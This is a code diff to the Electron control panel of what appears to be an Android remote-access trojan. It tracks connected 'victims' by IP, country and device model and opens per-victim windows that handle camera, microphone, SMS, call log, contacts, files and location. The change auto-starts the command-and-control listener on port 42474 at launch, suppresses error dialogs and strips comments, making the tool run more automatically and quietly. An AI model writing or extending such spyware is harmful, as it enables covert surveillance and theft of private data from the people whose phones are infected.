@@ -14,14 +14,10 @@ var IO;
 
 function createWindow() {
 
-
   // get Display Sizes ( x , y , width , height)
   display = electron.screen.getPrimaryDisplay();
 
-
-
   //------------------------SPLASH SCREEN INIT------------------------------------
-  // create the splash window
   let splashWin = new BrowserWindow({
     width: 600,
     height: 400,
@@ -40,24 +36,17 @@ function createWindow() {
     }
   });
 
-
-  // load splash file
   splashWin.loadURL('file://' + __dirname + '/app/splash.html');
 
   splashWin.webContents.on('did-finish-load', function () {
-    splashWin.show(); //close splash
+    splashWin.show();
   });
 
-
-  // Emitted when the window is closed.
   splashWin.on('closed', () => {
-    // Dereference the window object
     splashWin = null
   })
 
-
   //------------------------Main SCREEN INIT------------------------------------
-  // Create the browser window.
   win = new BrowserWindow({
     icon: __dirname + '/app/assets/img/icon.png',
     width: 800,
@@ -75,73 +64,72 @@ function createWindow() {
   });
 
   win.loadURL('file://' + __dirname + '/app/index.html');
-  //open dev tools
-  //win.webContents.openDevTools()
 
-  // Emitted when the window is closed.
   win.on('closed', () => {
-    // Dereference the window object, usually you would store windows
-    // in an array if your app supports multi windows, this is the time
-    // when you should delete the corresponding element.
     win = null
   })
 
   // Emitted when the window is finished loading.
   win.webContents.on('did-finish-load', function () {
     setTimeout(() => {
-      splashWin.close(); //close splash
-      win.show(); //show main
-
-      // AUTO-LISTEN: Start listening automatically on port 42474
-      if (!IO) {
-        var autoPort = 42474;
-        IO = io.listen(autoPort);
-        IO.sockets.pingInterval = 10000;
-        IO.sockets.on('connection', function (socket) {
-          var address = socket.request.connection;
-          var query = socket.handshake.query;
-          var index = query.id;
-          var remoteAddr = address.remoteAddress;
-          var ip = remoteAddr.includes(':') ? remoteAddr.split(':').pop() : remoteAddr;
-          if (ip == "1") ip = "127.0.0.1";
-          var country = null;
-          var geo = geoip.lookup(ip);
-          if (geo) country = geo.country.toLowerCase();
-          victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
-
-          let notification = new BrowserWindow({
-            frame: false,
-            x: display.bounds.width - 280,
-            y: display.bounds.height - 78,
-            show: false,
-            width: 280,
-            height: 78,
-            resizable: false,
-            toolbar: false,
-            webPreferences: { nodeIntegration: true }
-          });
-          notification.webContents.on('did-finish-load', function () {
-            notification.show();
-            setTimeout(function () { notification.destroy() }, 3000);
-          });
-          notification.webContents.victim = victimsList.getVictim(index);
-          notification.loadURL('file://' + __dirname + '/app/notification.html');
-          win.webContents.send('SocketIO:NewVictim', index);
-
-          socket.on('disconnect', function () {
-            victimsList.rmVictim(index);
-            win.webContents.send('SocketIO:RemoveVictim', index);
-            if (windows[index]) {
-              BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
-              delete windows[index];
-            }
-          });
-        });
-        // Notify the UI that we're listening
-        win.webContents.send('SocketIO:Listen', autoPort);
-        console.log('Auto-listening on port ' + autoPort);
-      }
+      splashWin.close();
+      win.show();
     }, 2000);
+
+    // AUTO-LISTEN: Wait 5s for UI to fully initialize, then start
+    setTimeout(function() {
+      try {
+        if (!IO) {
+          var autoPort = 42474;
+          IO = io.listen(autoPort);
+          IO.sockets.pingInterval = 10000;
+          IO.sockets.on('connection', function (socket) {
+            var address = socket.request.connection;
+            var query = socket.handshake.query;
+            var index = query.id;
+            var remoteAddr = address.remoteAddress;
+            var ip = remoteAddr.includes(':') ? remoteAddr.split(':').pop() : remoteAddr;
+            if (ip == "1") ip = "127.0.0.1";
+            var country = null;
+            var geo = geoip.lookup(ip);
+            if (geo) country = geo.country.toLowerCase();
+            victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
+
+            var notification = new BrowserWindow({
+              frame: false,
+              x: display.bounds.width - 280,
+              y: display.bounds.height - 78,
+              show: false,
+              width: 280,
+              height: 78,
+              resizable: false,
+              toolbar: false,
+              webPreferences: { nodeIntegration: true }
+            });
+            notification.webContents.on('did-finish-load', function () {
+              notification.show();
+              setTimeout(function () { notification.destroy() }, 3000);
+            });
+            notification.webContents.victim = victimsList.getVictim(index);
+            notification.loadURL('file://' + __dirname + '/app/notification.html');
+            win.webContents.send('SocketIO:NewVictim', index);
+
+            socket.on('disconnect', function () {
+              victimsList.rmVictim(index);
+              win.webContents.send('SocketIO:RemoveVictim', index);
+              if (windows[index]) {
+                BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
+                delete windows[index];
+              }
+            });
+          });
+          win.webContents.send('SocketIO:Listen', autoPort);
+          console.log('Auto-listening on port ' + autoPort);
+        }
+      } catch(e) {
+        console.log('Auto-listen error: ' + e.message);
+      }
+    }, 5000);
   });
 }
 
@@ -149,21 +137,16 @@ function createWindow() {
 
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
-// Some APIs can only be used after this event occurs.
 app.on('ready', createWindow)
 
 // Quit when all windows are closed.
 app.on('window-all-closed', () => {
-  // On macOS it is common for applications and their menu bar
-  // to stay active until the user quits explicitly with Cmd + Q
   if (process.platform !== 'darwin') {
     app.quit()
   }
 })
 
 app.on('activate', () => {
-  // On macOS it's common to re-create a window in the app when the
-  // dock icon is clicked and there are no other windows open.
   if (win === null) {
     createWindow()
   }
@@ -171,18 +154,17 @@ app.on('activate', () => {
 
 
 
-//handle the Uncaught Exceptions
-
-
-
-// fired when start listening
-// It will be fired when AppCtrl emit this event
+// fired when start listening (manual click from UI)
 ipcMain.on('SocketIO:Listen', function (event, port) {
+  if (IO) {
+    // Already listening, don't create another
+    event.sender.send('SocketIO:Listen', "Address Already in Use");
+    return;
+  }
 
   IO = io.listen(port);
   IO.sockets.pingInterval = 10000;
   IO.sockets.on('connection', function (socket) {
-    // Get victim info
     var address = socket.request.connection;
     var query = socket.handshake.query;
     var index = query.id;
@@ -190,16 +172,12 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     var ip = remoteAddr.includes(':') ? remoteAddr.split(':').pop() : remoteAddr;
     if (ip == "1") ip = "127.0.0.1";
     var country = null;
-    var geo = geoip.lookup(ip); // check ip location
+    var geo = geoip.lookup(ip);
     if (geo)
       country = geo.country.toLowerCase();
 
-    // Add the victim to victimList
     victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
 
-
-    //------------------------Notification SCREEN INIT------------------------------------
-    // create the Notification window
     let notification = new BrowserWindow({
       frame: false,
       x: display.bounds.width - 280,
@@ -214,7 +192,6 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       }
     });
 
-    // Emitted when the window is finished loading.
     notification.webContents.on('did-finish-load', function () {
       notification.show();
       setTimeout(function () { notification.destroy() }, 3000);
@@ -223,22 +200,14 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     notification.webContents.victim = victimsList.getVictim(index);
     notification.loadURL('file://' + __dirname + '/app/notification.html');
 
-
-
-    //notify renderer proccess (AppCtrl) about the new Victim
     win.webContents.send('SocketIO:NewVictim', index);
 
     socket.on('disconnect', function () {
-      // Decrease the socket count on a disconnect
       victimsList.rmVictim(index);
-
-      //notify renderer proccess (AppCtrl) about the disconnected Victim
       win.webContents.send('SocketIO:RemoveVictim', index);
 
       if (windows[index]) {
-        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
         BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
-        //delete the window from windowsList
         delete windows[index]
       }
     });
@@ -250,21 +219,17 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
 
 //handle the Uncaught Exceptions
 process.on('uncaughtException', function (error) {
-
   if (error.code == "EADDRINUSE") {
-    win.webContents.send('SocketIO:Listen', "Address Already in Use");
+    if (win) win.webContents.send('SocketIO:Listen', "Address Already in Use");
   } else {
-    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
+    console.log('Uncaught error: ' + (error.message || JSON.stringify(error)));
   }
-
 });
 
 
 
 // Fired when Victim's Lab is opened
 ipcMain.on('openLabWindow', function (e, page, index) {
-  //------------------------Lab SCREEN INIT------------------------------------
-  // create the Lab window
   let child = new BrowserWindow({
     icon: __dirname + '/app/assets/img/icon.png',
     parent: win,
@@ -279,11 +244,8 @@ ipcMain.on('openLabWindow', function (e, page, index) {
     }
   })
 
-  //add this window to windowsList
   windows[index] = child.id;
-  //child.webContents.openDevTools();
 
-  // pass the victim info to this victim lab
   child.webContents.victim = victimsList.getVictim(index).socket;
   child.loadURL('file://' + __dirname + '/app/' + page)
 
@@ -293,15 +255,14 @@ ipcMain.on('openLabWindow', function (e, page, index) {
 
   child.on('closed', () => {
     delete windows[index];
-    //on lab window closed remove all socket listners
     if (victimsList.getVictim(index).socket) {
-      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
-      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
-      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
-      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
-      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
-      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
-      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
+      victimsList.getVictim(index).socket.removeAllListeners("x0000ca");
+      victimsList.getVictim(index).socket.removeAllListeners("x0000fm");
+      victimsList.getVictim(index).socket.removeAllListeners("x0000sm");
+      victimsList.getVictim(index).socket.removeAllListeners("x0000cl");
+      victimsList.getVictim(index).socket.removeAllListeners("x0000cn");
+      victimsList.getVictim(index).socket.removeAllListeners("x0000mc");
+      victimsList.getVictim(index).socket.removeAllListeners("x0000lm");
     }
   })
 });
